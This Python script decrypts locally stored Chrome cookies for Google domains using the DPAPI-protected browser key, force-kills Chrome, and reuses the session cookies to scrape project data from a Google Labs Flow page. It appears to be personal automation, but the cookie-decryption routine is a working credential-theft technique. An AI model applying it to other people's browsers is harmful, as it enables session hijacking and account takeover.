import os
import requests
import json
import sqlite3
import win32crypt
import base64
from Crypto.Cipher import AES
import shutil
from bs4 import BeautifulSoup
import re
import time

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except Exception as e:
        return ""

def get_cookie_jar():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Profile 1", "Network", "Cookies")
    filename = "Cookies_temp.db"
    try:
        shutil.copyfile(db_path, filename)
    except PermissionError:
        print("Cannot copy cookies, Chrome is locking the DB. Please kill Chrome.")
        return None
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key like '%google%'")
    
    cj = requests.cookies.RequestsCookieJar()
    count = 0
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value
        cj.set(name, decrypted_value, domain=host_key)
        count += 1
        
    cursor.close()
    db.close()
    os.remove(filename)
    print(f"Extracted {count} Google cookies!")
    return cj

def get_clip_urls():
    cj = get_cookie_jar()
    if not cj:
        return None
        
    url = "https://labs.google/fx/tools/flow/project/827275bd-d7fa-422b-9c90-b67109344d47"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
    }
    
    print(f"Fetching {url}...")
    resp = requests.get(url, cookies=cj, headers=headers)
    
    print(f"Status: {resp.status_code}, Length: {len(resp.text)}")
    
    soup = BeautifulSoup(resp.text, 'html.parser')
    next_data_script = soup.find('script', id='__NEXT_DATA__')
    if not next_data_script:
        print("Could not find __NEXT_DATA__ in HTML.")
        return None
        
    next_data = json.loads(next_data_script.string)
    
    try:
        dehydrated = next_data["props"]["pageProps"]["trpcState"]["json"]["queries"]
        print("Found queries with keys:")
        for query in dehydrated:
            print(query["queryKey"])
            if query["queryKey"][0] == "project" and query["queryKey"][1] == "get":
                project_data = query["state"]["data"]
                return project_data["components"], cj
    except Exception as e:
        print("Error parsing state:", e)
        return None
        
    return None

if __name__ == "__main__":
    os.system("taskkill /F /IM chrome.exe /T")
    time.sleep(2)
    result = get_clip_urls()
    if result:
        components, cj = result
        print(f"Success! Found {len(components)} components.")
    else:
        print("Failed.")
